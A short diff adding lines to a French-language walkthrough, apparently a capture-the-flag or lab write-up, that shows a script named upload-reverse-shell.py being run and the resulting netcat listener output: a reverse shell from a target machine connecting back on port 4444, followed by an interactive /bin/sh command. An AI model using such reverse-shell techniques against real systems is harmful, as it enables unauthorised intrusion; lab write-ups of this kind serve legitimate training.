@@ -199,3 +199,10 @@ On exécute finalement le script `upload-reverse-shell.py`:
 ```bash
 python upload-reverse-shell.py
 ```
+
+On voit qu'une connexion est établie à netcat:
+```bash
+listening on [any] 4444 ...
+connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 51092
+uname -a; w; id; /bin/sh -i
+```
